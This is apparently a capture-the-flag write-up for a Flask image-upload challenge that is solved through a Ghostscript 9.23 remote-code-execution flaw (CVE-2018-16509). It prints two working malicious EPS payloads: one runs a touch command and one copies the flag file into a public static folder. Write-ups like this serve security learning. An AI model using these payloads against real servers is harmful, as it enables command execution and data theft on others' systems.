1. After we analyzed this simple web application, we found that
   - The flag file was not used/included in the application, but the whole `challenge` was copied into the docker.
   - It only had one API, `POST /upload`, in `application/blueprints/routes.py`.
   - The app's directory would seem like `/app/application/static/petpets` according to `config.py`
   - The `allowed_file` checks file extension but we didn't intend to use file upload on python server.
   - The only special function in the application is `petpet` in `application/util.py`.
   - `petpet` uses the `PIL` to do the image processing, and the package used was described in `Dockerfile`. It used `ghostscript-9.23` for its Pillow component.

2. After googling the `ghostscript 9.23 exploit`, we found [CVE-2018-16509](https://www.cvedetails.com/cve/CVE-2018-16509/) and an [example](https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509).

```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%touch /tmp/got_rce) currentdevice putdeviceprops
```

3. Since the web server didn't return our uploaded image directory, we cannot use `cat` to output the `flag` file. Thus, we will use `cp` to send the `flag` to `static` directory to allow public access.

```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%cp /app/flag /app/application/static/flag) currentdevice putdeviceprops
```

4. Then, we accessed `/static/flag` to get the flag.